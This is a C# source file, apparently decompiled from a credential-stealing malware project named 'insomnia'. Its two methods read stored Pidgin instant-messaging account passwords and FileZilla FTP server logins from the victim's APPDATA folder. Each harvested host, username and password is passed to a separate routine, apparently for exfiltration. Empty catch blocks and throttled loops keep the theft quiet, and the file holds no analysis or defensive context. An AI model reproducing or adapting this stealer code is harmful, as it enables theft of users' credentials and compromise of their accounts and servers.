using System;
using System.IO;
using System.Threading;
using System.Xml;

namespace insomnia;

internal class Class27
{
	public static void Method2()
	{
		try
		{
			XmlDocument xmlDocument = new XmlDocument();
			string text = Environment.GetEnvironmentVariable("APPDATA") + "\\.purple\\accounts.xml";
			if (File.Exists(text))
			{
				xmlDocument.Load(text);
				XmlNodeList elementsByTagName = xmlDocument.GetElementsByTagName("protocol");
				XmlNodeList elementsByTagName2 = xmlDocument.GetElementsByTagName("name");
				XmlNodeList elementsByTagName3 = xmlDocument.GetElementsByTagName("password");
				for (int i = 0; i < elementsByTagName.Count; i++)
				{
					Class31.Method3("[IM]: " + elementsByTagName[i]!.InnerText.ToUpper().Replace("PRPL-", "") + " -> " + elementsByTagName2[i]!.InnerText + " : " + elementsByTagName3[i]!.InnerText, Class26.Field8);
					Thread.Sleep(500);
				}
			}
		}
		catch
		{
		}
	}

	public static void Method1()
	{
		try
		{
			XmlDocument xmlDocument = new XmlDocument();
			string text = Environment.GetEnvironmentVariable("APPDATA") + "\\FileZilla\\recentservers.xml";
			if (File.Exists(text))
			{
				xmlDocument.Load(text);
				XmlNodeList elementsByTagName = xmlDocument.GetElementsByTagName("Host");
				XmlNodeList elementsByTagName2 = xmlDocument.GetElementsByTagName("User");
				XmlNodeList elementsByTagName3 = xmlDocument.GetElementsByTagName("Pass");
				for (int i = 0; i < elementsByTagName.Count; i++)
				{
					Class31.Method3("[FTP]: " + elementsByTagName[i]!.InnerText + " -> " + elementsByTagName2[i]!.InnerText + " : " + elementsByTagName3[i]!.InnerText, Class26.Field8);
					Thread.Sleep(500);
				}
			}
		}
		catch
		{
		}
	}
}
